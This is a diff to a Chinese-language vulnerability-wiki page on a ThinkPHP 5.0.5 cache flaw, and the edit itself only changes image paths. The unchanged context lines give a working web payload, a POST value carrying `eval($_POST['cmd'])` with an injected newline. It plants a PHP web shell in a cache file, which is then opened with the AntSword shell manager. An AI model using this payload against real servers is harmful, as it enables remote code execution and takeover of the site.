@@ -42,19 +42,19 @@ Thinkphp 5.0.5
 ```
 -   在index控制器写如下代码：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp5.0.5缓存漏洞/media/rId25.png)
+![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId25.png)
 
 -   之后访问
     `http://www.0-sec.org/public/index.php/Home/index`POST数据：`con=%0aeval($_POST['cmd']);%0d//`
 -   最终在
     `runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php`文件生成shell：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp5.0.5缓存漏洞/media/rId26.png)
+![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId26.png)
 
 之后访问蚁剑
 `http://www.0-sec.org/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php`
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp5.0.5缓存漏洞/media/rId27.png)
+![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId27.png)
 
 ### 小结
 
